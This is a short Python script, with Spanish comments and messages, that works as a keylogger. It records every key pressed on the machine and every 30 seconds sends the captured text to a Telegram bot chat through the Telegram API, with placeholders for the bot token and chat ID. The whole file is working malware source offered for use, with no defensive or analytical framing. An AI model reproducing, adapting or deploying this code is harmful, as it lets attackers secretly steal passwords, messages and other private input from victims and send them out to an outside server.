import requests
import keyboard
from threading import Timer

telegram_bot_token = "token_del_bot"

telegram_chat_id = "tu_id"

interval = 30

logged_words = ""

def send_logs():
    global logged_words
    if logged_words:
        try:
            
            message = f"Palabras registradas:\n{logged_words}"

            url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
            params = {"chat_id": telegram_chat_id, "text": message}
            requests.post(url, params=params)

            logged_words = ""
        except Exception as e:
            print("El error al enviar el logs:", str(e))

    timer = Timer(interval, send_logs)
    timer.start()

def on_key_press(event):
    global logged_words
    if event.name == "space":
        logged_words += " "
    elif event.name.lower() == "alt gr":
        
        pass
    else:
        logged_words += event.name

keyboard.on_press(on_key_press)

send_logs()


